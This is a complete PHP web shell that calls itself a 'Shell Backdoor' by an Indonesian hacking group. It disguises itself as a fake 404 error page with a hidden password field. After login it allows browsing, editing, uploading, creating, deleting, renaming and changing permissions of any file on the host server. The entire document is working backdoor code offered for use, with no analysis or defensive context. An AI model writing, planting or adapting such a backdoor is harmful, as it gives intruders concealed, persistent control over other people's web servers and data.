<?php 
	error_reporting(0);
	session_start();
	$geturl = "https://".$_SERVER["HTTP_HOST"].$_SERVER["PHP_SELF"];
	$version = $_SERVER["HTTP_USER_AGENT"];
	$userpass = '$2y$10$cpxqU.aXL1Q8f6eMHNP1rugPJXrDJQuF1rov7m0KktVGoR4CEqju2';

	if (isset($_POST["buttonpass"])) {
		$userpassword = $_POST["pass"];

		if (password_verify($userpassword, $userpass)) {
			$_SESSION["administrator"] = True;
		}
	}

	if (!isset($_SESSION["administrator"])) {
		echo '<title>404 Not found</title><h1>Not Found</h1><p>The requested URL '.$geturl.'</p><hr><i>'.$version.'</i><form method="post"><input type="password" name="pass" style="border:1px solid white;"><button type="submit" name="buttonpass" style="border:1px solid white; background:white;color:white;"></button></form>';
		exit;
	}

	class INTRO {

		var $shellbackdoor ;
		var $Linkshellbackdoor ;
		var $nomor;
	

	}
		$kumpulan = new INTRO();

		$kumpulan->Linkshellbackdoor= "
		<link rel='stylesheet' href='https://stackpath.bootstrapcdn.com/bootstrap/4.5.0/css/bootstrap.min.css'
		integrity='sha384-9aIt2nRpC12Uk9gS9baDl411NQApFmC26EwAOH8WgZl5MYYxFfc+NcPb1dKGj7Sk' crossorigin='anonymous'>
		
		";

		$kumpulan->shellbackdoor= "

		 <script src='https://code.jquery.com/jquery-3.5.1.slim.min.js' integrity='sha384-DfXdz2htPH0lsSSs5nCTpuj/zy4C+OGpamoFVy38MVBnE+IbbVYUew+OrCXaRkfj' crossorigin='anonymous'></script>
	    <script src='https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js' integrity='sha384-Q6E9RHvbIyZFJoft+2mJbHaEWldlvI9IOYy5n3zV9zzTtmI3UksdQRVvoxMfooAo' crossorigin='anonymous'></script>
	    <script src='https://stackpath.bootstrapcdn.com/bootstrap/4.5.0/js/bootstrap.min.js' integrity='sha384-OgVRvuATP1z7JjHLkuOU7Xw704+h835Lr+6QL9UvYjZE3Ipu6Tp75j7Bh/kR0JKI' crossorigin='anonymous'></script>

		";
		$kumpulan->nomor= 1 ;

		if (isset($_POST["submit"])) {
		$file = $_FILES['file'];

		$namafile = $_FILES["file"]["name"];
		$exerror = $_FILES["file"]["error"];
		$ukuranfile = $_FILES["file"]["size"];
		$foldersementara = $_FILES["file"]["tmp_name"];

		move_uploaded_file($foldersementara , $namafile );
	}

?>

<!DOCTYPE html>
<html>
<head>
	<link href="https://fonts.googleapis.com/css2?family=Anton&family=Lobster&family=Teko:wght@500&display=swap" rel="stylesheet">
	<link href="https://fonts.googleapis.com/css2?family=Chewy&family=Josefin+Slab:wght@700&family=Staatliches&family=Unica+One&display=swap" 
    rel="stylesheet">
    <link href="https://fonts.googleapis.com/css2?family=Chewy&family=Josefin+Slab:wght@700&family=Unica+One&display=swap" rel="stylesheet"> 
    <link href="https://fonts.googleapis.com/css2?family=Josefin+Slab:wght@700&family=Unica+One&display=swap" rel="stylesheet"> 
    <link href="https://fonts.googleapis.com/css2?family=Permanent+Marker&display=swap" rel="stylesheet"> 
	<?php echo $kumpulan->Linkshellbackdoor;  ?>
	<title>INDO々TEAM</title>
	<style type="text/css">
		.background-head{
			background-color: #272822;
			color: #75715e;
			}
		h1{
			font-weight: 700; 
        	color: #ff007f;
        	font-family: 'Anton', sans-serif;
    		font-family: 'Lobster', cursive;
    		font-family: 'Teko', sans-serif;
		}
		*{
	      font-family: 'Josefin Slab', serif;
          font-family: 'Unica One', cursive;
          font-size: 18px;	    
		}
		.conten {
			 border: 1px solid white;
		 			
		}
		.table {
			background-color: transparent;
			color: white;
		}
		.red{
			color: red;
			background-color: navy;
		}
		.paleturquoise{
			color: paleturquoise;
		}
		.Directoricolor{
			color: red;
		}
		.custom-select{
			background-color: transparent; 
		}
		.custom-file-input{
			background-color: transparent;
		}
		.form-control{
			border: transparent;
		}
		input[type="file"]{
            background: none;
		}
		.custom-control-label::before, .custom-file-label, .custom-select{
			background:none;
			border-color:white;
		}
		.btn-primary:hover{
			background-color: sandybrown;
		}
		.btn-dark{
			border-color: white; 
		}
		.btn-dark:hover{
			background-color: red;
		}
		textarea.form-control{
			background-color: black;
			height: 400px;
			color: #7FFF00;
			font-weight: bold;
		}
		textarea.form-control:hover{
			background-color: black;
			color: #7FFF00;
			font-weight: bold;
		}
		textarea.form-control:focus{
			background-color: black;
			color: #7FFF00;
			font-weight: bold;
		}
		.Permision{
			color: red;
		}

		.overlay {
			width: auto;
			height: auto;
			overflow: hidden;
			position: fixed;
			top: 0;
			bottom: 0;
			right: 0;
			left: 0;
			background-color: rgba(0,0,0,.8);
			z-index: 9999;
			text-align: center;
			padding: 100px;

		}
		.box{
			width: 347px;
            padding: 36px;
            position: absolute;
            top: 45%;
            left: 50%;
            transform: translate(-50%,-50%);
            background: #191919;
            text-align: center;
            border-radius: 32px;
            box-shadow: 2px 2px 10px rgba(0,0,0,.2);
            animation: xcon 1s;

		}

        }
        .Loginkuy{
            background: #191919;
            color: #ff0000;
        }
        .inputx{
            border-radius: 45px;
            background: none;
            color: aliceblue;
            transition: 0.25s;
            border: 1px solid blue;
            margin: 8px;
            text-align: center;
            outline: none;
            width: 181px;
            height: 34px;
        }

        .inputx:focus{
            width: 181px;
            border: 1px solid springgreen;
            color: rgb(160, 158, 158);
        }
        .xbutton{
            background: none;
            border-radius: 39px;
            width: 158px;
            color: rgb(160, 158, 158);
            margin: 8px;
            text-align: center;
            border: 1px solid green;
            padding: 2px;
            cursor: pointer;
            transition: 0.25s;
            height: 32px;
            width: 62px;
        }
        .xbutton:hover{
            background: rgb(16, 91, 167);
        }

		.overlay .close{
			position: absolute;
			top: 0;
			left: 98%;
			color: white;
		}        
        	
     


        @keyframes xcon {
        	0% {
        		transform: scale(0);
        		opacity: 0;
        	
        	}

        	347% {
        		transform: scale(1);
        		opacity: 1;
        	
        	}
        }
        input.form-control.form{
			background-color: black;
			color: #7FFF00;
			font-weight: bold;
			border: 1px solid red;
		}


	</style>
</head>
<body  class="background-head" >
	<div class="container">
		<div class="row pt-4 mb-4">
  			<div class="col text-center">
  				<h1>INDO々TEAM</h1>
  				<h4 class="rumah">Jayalah Indonesia Ku Shell Backdoor 1.0 BY Mr.M4</h4>
  			</div>
  		</div>
	</div>

	<div class="row justify-content-center">
	<div class="col-lg-12">
	<div class="conten" id="conten">
	<div class="form-row">

	<?php
		echo "<div class='col-md-6'>
		<span class='Directoricolor'>[<span class='paleturquoise'>?</span>] Directori Saat Ini </span> : ";
		if (isset($_GET["Directori"])) {
			$Directori = $_GET["Directori"];
		}else {
			$Directori = getcwd();
		}
		$Directori = str_replace("\\","/", $Directori);

		$Directoris = explode("/", $Directori);

		foreach($Directoris as $key => $value ){
			if ($value == '' && $key == 0 ) { 
				echo '<a href="?Directori=/">/</a>'; continue;
			}   echo '<a href="?Directori=';
			for($i=0;$i<=$key;$i++){
				echo "$Directoris[$i]"; if($i !== $key ) echo '/';
			} echo '">'. $value . '</a>/';

		}
		echo "</div>";
		echo "</div>";
		if($open = opendir($Directori)){
						echo '
					  	
						  <table class="table" border="1" cellpadding="10" cellspacing="0">
						   <tr>
						   <thead>
						    <tr>
						      <th scope="col">NO</th>
						      <th scope="col">ISI Directori</th>
						      <th scope="col">Size</th>
						      <th scope="col">Action</th>
						      <th scope="col">Option</th>
						      <th scope="col">Permision</th>
						      <th scope="col">Control</th>
						    </tr>
						  </thead>
						  ';
						
			while(($isidirectori = readdir($open)) !== false ){
				if($isidirectori !== '.' && $isidirectori !== '..'){
					echo '<tr>
						  <td class="col-md-1">'.$kumpulan->nomor.'</td>
						  <td class="col-md-2"><a href="?Directori='.$Directori.'/'.$isidirectori.'">'. $isidirectori . '</a></td>
						  <td class="col-md-1">';


							$size = filesize("$Directori/$isidirectori")/1024;


							$size = round($size,3);
							if($size >= 1024){
							$size = round($size/1024,2). 'MB';
							}else{
							$size = $size.' KB';
							}


					echo ''.$size.' </td>
						  <td class="col-md-2"><a href="?Direc='.$Directori.'/'.$isidirectori.'&file='.$isidirectori.'" class="btn btn-primary" id="edit">EDIT</a>
						  	<a href="?rename='.$Directori.'/'.$isidirectori.'" class="btn btn-primary" id="rename">RENAME</a>
						  </td>
						  <td class="col-md-1 ">
						  <a href="'.$isidirectori.'" class="btn btn-primary" id="View">VIEW</a>
						  </td>
						  <td class="col-md-2">'; echo perms("$Directori/$isidirectori"); 


					echo  '</td>
						  <td class="col-md-3">
							<a href="?Delete='. $Directori .'/'. $isidirectori .'" class="btn btn-primary">Delete</a> 
							<a href="'.$isidirectori.'" class="btn btn-primary" download>Download</a>
							<a href="?IND='.$Directori.'/'.$isidirectori.'" class="btn btn-primary">Chmod</a>
						  </td>
						  </tr>

						 ';
						 $kumpulan->nomor++;
				}
				
			}


			echo '
			
			<div class="input-group is-invalid">
			  <a class="btn btn-dark" href="?createfile='.$Directori.'" name="newfile" >NEW</a>
			  <a class="btn btn-dark" href="?createfolder='.$Directori.'" name="Create" >Folder</a>
			  <a class="btn btn-dark" href="index.php" name="Menushell" >RELOAD</a>
			<form method="post" enctype="multipart/form-data" action="?Directori='. $Directori . '">
			<div class="custom-file">
			  <input type="file" name="file" class="custom-file-input" id="customFile">
			  <label class="custom-file-label" for="customFile" data-browse="GO">Choose file</label>
			</div>
			 <div class="input-group-append">
		       <button class="btn btn-dark" name="submit" type="submit">Upload</button>
		       </form>
		       <a class="btn btn-dark" name="IP" >182.1.61.5</a>
		    </div>
			</div>		
			</tr></table>
			
			';
			
			closedir($open);
		}

 

			
	?>

	</div>
	</div>
	</div>

<!-- Edit -->
	<div class="conten-edit" id="conten-edit">

		<?php  
			if(isset($_GET['Direc'])){
			echo '
				<!DOCTYPE html>
				<html>
				<head>
					<title></title>
					<style type="text/css">
					.conten{
						display:none;
					}
					</style>
				</head>
				<body>


				<form method="POST" action="?Directori='. $Directori .'">
				<a href="?Directori='.$Directori.'"  class="btn btn-secondary btn-lg btn-block">Menu</a>
				<textarea class="form-control" name="Edit" id="exampleFormControlTextarea1" rows="3" required>
				'.htmlspecialchars(file_get_contents($_GET['Direc'])).'
				</textarea>
				<input type="hidden" name="file" value="'.$_GET['file'].'" required>
				<button type="submit" name="Go" class="btn btn-secondary btn-lg btn-block">EDIT</button>
				

				</form>
				</body>
				</html>
				'
				;
			}

			if(isset($_POST['Edit'])){
			$file = fopen($_POST['file'],'w');
			if(fwrite($file,$_POST['Edit'])){
			echo '<script>alert("Berhasil Diedit");</script>';
			}else{
			echo '<script>alert("Gagal Diedit");</script>';
			}
			fclose($file);
			}


		?>
<!-- ----------------------------------------------------------------------------------------------- -->			
	</div>

	<div class="option">
		<?php 
			if (isset($_GET["Delete"])) {
			if (unlink($_GET["Delete"])) {
				echo '<script>alert("Berhasil Dihapus");</script>';

			}else{
				echo '<script>alert("Berhasil Dihapus");</script>';
			}
			}
			
		?>
	</div>

	<div class="Permision" style="color: red;">
		
		<?php  
		function perms($file){
		$perms = fileperms($file);

		if (($perms & 0xC000) == 0xC000) {

		$info = 's';
		}

		elseif (($perms & 0xA000) == 0xA000) {

		$info = 'l';
		} elseif (($perms & 0x8000) == 0x8000) {

		$info = '-';
		} elseif (($perms & 0x6000) == 0x6000) {

		$info = 'b';
		} elseif (($perms & 0x4000) == 0x4000) {

		$info = 'd';
		} elseif (($perms & 0x2000) == 0x2000) {

		$info = 'c';
		} elseif (($perms & 0x1000) == 0x1000) {

		$info = 'p';
		} else {

		$info = 'u';
		}

		$info .= (($perms & 0x0100) ? ' r ' : ' - ');
		$info .= (($perms & 0x0080) ? ' w ' : ' - ');
		$info .= (($perms & 0x0040) ?
		(($perms & 0x0800) ? ' s ' : ' x ' ) :
		(($perms & 0x0800) ? ' S ' : ' - '));


		$info .= (($perms & 0x0020) ? ' r ' : ' - ');
		$info .= (($perms & 0x0010) ? ' w ' : ' - ');
		$info .= (($perms & 0x0008) ?
		(($perms & 0x0400) ? ' s ' : ' x ' ) :
		(($perms & 0x0400) ? ' S ' : ' - '));


		$info .= (($perms & 0x0004) ? ' r ' : ' - ');
		$info .= (($perms & 0x0002) ? ' w ' : ' - ');
		$info .= (($perms & 0x0001) ?
		(($perms & 0x0200) ? ' t ' : ' x ' ) :
		(($perms & 0x0200) ? ' T ' : ' - '));

		return $info;
		}


		?>
	</div>

<!-- chmod -->
			<div class="Chmod">
				<?php 

				if (isset($_GET["IND"])) {
					$filename = $_GET["IND"];
 					$modefile = substr(sprintf('%o', fileperms($filename)), -4 );
					echo '	<div class="overlay" id="Permision">
						<a href="index.php" class="close">x</a>
						<div class="box">
							<form class="InputdatabaseKu text-center" method="POST" action="index.php">
								<div class="form-row">
									<div class="form-grup-md-2">										
										<input type="hidden" name="filename" value="'.$filename.'">
				                		 <select name="setmode" class="inputx" required>
											  <option selected ></option>
											  <option value="33279">777</option>
											  <option value="33188">644</option>
											  <option value="33152">600</option>
											  <option value="33206">666</option>
											  <option value="33225">711</option>
											  <option value="33277">775</option>
											  <option value="33216">700</option>
										  </select>
				                	</div>
				                	<div class="form-grup-md-2">
				               			<button type="submit" class="btn btn-dark xbutton" name="buttonMode">GO</button>
				               	    </div>
				                </div>
				            </form>
						</div>
					</div>';
				}

				if (isset($_POST["buttonMode"])) {
	 				if (chmod($_POST["filename"], $_POST["setmode"])) {
	 					echo "<script>aler('Berhasil');</script>";
	 				}else {
	 					echo "<script>aler('Gagal');</script>";
	 				}
 				}

				?>
			</div>


<!-- file -->
			<div class="NEW-FILE">
				<?php
					if (isset($_GET["createfile"])) {
						$location = $_GET["createfile"];
					  	echo '
					  	     <!DOCTYPE html>
								<html>
								<head>
									<title></title>
									<style type="text/css">
									.conten{
										display:none;
									}
									</style>
								</head>
								<body>
					  	     <form method="post" action="index.php">
					  			<input type="text" class="form-control form"  name="namefilebaru" value="'.$location.'">
								<textarea class="form-control form" name="isifilebaru"></textarea>
								<button type="submit" name="buttonfile" class="btn btn-secondary btn-lg btn-block">CREATE</button>
							  </form>';
					  } 

					    if (isset($_POST["buttonfile"])) {
						  	$namefile = fopen($_POST["namefilebaru"], "w");
						  	if (fwrite($namefile, $_POST["isifilebaru"])) {
						  		echo '<script>alert("Berhasil Dibuat");</script>';
						  	}else {
						  		echo '<script>alert("Gagal Dibuat ! Ada Kesalahan ");</script>';
						  	}
						  }

				?>
			</div>

<!-- folder -->
			<div class="NEW-FOLDER">
				<?php  
					if (isset($_GET["createfolder"])) {
						$location = $_GET["createfolder"];
						echo '	<div class="overlay" id="createfolder">
						<a href="index.php" class="close">x</a>
						<div class="box">
							<form class="InputdatabaseKu text-center" method="POST" action="index.php">
								<div class="form-row">
									<div class="form-grup-md-2">
				                		<input class="inputx" type="text" name="namafolder" id="file" value="'.$location.'" required>
				                	</div>
				                	<div class="form-grup-md-2">
				               			<button type="submit" name="buttonfolder" class="btn btn-dark xbutton">SAVE</button>
				               	    </div>
				                </div>
				            </form>
						</div>
					</div>';
					}
						if (isset($_POST["buttonfolder"])) {
							if (mkdir($_POST["namafolder"])) {
								echo '<script>alert("Berhasil Dibuat");</script>';
						  	}else {
						  		echo '<script>alert("Gagal Dibuat ! Ada Kesalahan ");</script>';
						  	}
						}
				?>
			</div>

			<div class="rename">
				<?php  
					if (isset($_GET["rename"])) {
						echo '<div class="overlay" id="createfolder">
						<a href="index.php" class="close">x</a>
						<div class="box">
							<form class="InputdatabaseKu text-center" method="POST" action="index.php">
								<div class="form-row">
									<div class="form-grup-md-2">
				                		<input class="inputx" type="hidden" name="oldname" id="file" value="'.$_GET["rename"].'" required>
				                		<input class="inputx" type="text" name="newname" id="file" value="'.$_GET["rename"].'" required>
				                	</div>
				                	<div class="form-grup-md-2">
				               			<button type="submit" name="buttonrename" class="btn btn-dark xbutton">SAVE</button>
				               	    </div>
				                </div>
				            </form>
						</div>
					</div>';
					}
					if (isset($_POST["buttonrename"])) {
						if (rename($_POST["oldname"], $_POST["newname"])) {
							echo "<script>alert('Berhasil Diubah');</script>";
						}else {
							echo "<script>alert('Gagal Diubah');</script>";
						}
					}
				?>
			</div>



	<?php echo $kumpulan->shellbackdoor ; ?>
</body>
</html>

